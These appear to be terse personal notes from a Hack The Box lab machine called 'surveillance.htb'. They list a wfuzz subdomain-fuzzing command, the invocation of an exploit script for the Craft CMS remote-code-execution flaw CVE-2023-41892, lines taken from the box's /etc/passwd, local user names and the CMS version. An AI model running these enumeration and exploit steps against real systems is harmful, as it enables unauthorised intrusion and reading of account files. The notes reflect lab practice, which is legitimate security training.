# ip
10.10.11.245

# wfuzz subdomains
wfuzz --hh 154 -c -w ../../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST:FUZZ.surveillance.htb" http://surveillance.htb

# rce cve-2023-41892
python3 craft-cms.py http://surveillance.htb

# etc/passwd
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
mysql:x:114:122:MySQL Server,,,:/nonexistent:/bin/false
zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
fwupd-refresh:x:115:123:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

# user
matthew
zoneminder


# versio
"craftcms/cms": "4.4.14"